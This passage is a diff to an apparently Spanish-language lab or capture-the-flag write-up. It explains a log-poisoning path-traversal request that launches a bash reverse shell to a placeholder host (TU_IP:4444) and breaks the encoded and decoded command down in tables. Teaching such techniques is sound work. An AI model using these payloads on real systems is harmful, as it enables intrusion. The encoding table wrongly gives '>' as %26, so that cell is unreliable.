@@ -267,6 +267,40 @@ Enviar shell inversa.
 ```bash
 curl "http://172.17.0.2/index.php?studio=../../../var/log/vsftpd.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/TU_IP/4444+0>%261'"
 ```
+Desglose.
+```bash
+&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/TU_IP/4444+0>%261'"
+```
+| Parte | Significado |
+| --- | --- |
+| **&** | Separador de parámetros | 
+| **cmd** | Parámetro que ejecuta el código PHP del log |
+| **=** | Asignación de valor |
+| **bash+-i+>%26+/dev/tcp/TU_IP/4444+0>%261** | Comando a ejecutar |
+
+Tabla de Encoding.
+| Carácter Original | URL Encoded | Significado |
+| --- | --- | --- |
+| **(espacio)** | + | Separador de argumentos |
+| **>** | %26 | 	Redirección de salida |
+| **&** | %26 | AMPERSAND (redirección de file descriptors) |
+| **/** | / | 	Separador de ruta (se mantiene) |
+| **'** | ' | 	Comillas (se mantienen) |
+| **-** | - | 	Guiones (se mantienen) |
+
+Comando Original (sin encoding)
+```bash
+bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'
+```
+| Parte | Significado |
+| --- | --- |
+| **bash** | Ejecutar shell bash | 
+| **-c** | Ejecutar el siguiente string como comando |
+| **bash -i** | Bash en modo interactivo |
+| **>&** | 	Redirigir stdout y stderr |
+| **/dev/tcp/TU_IP/4444** | 		Conexión TCP a TU_IP en puerto 4444 |
+| **0>&1** |  Redirigir stdin al mismo socket |
+
 Logramos la conexión.
 ```bash
 www-data@b95b968aa04d:/var/www/html$ 
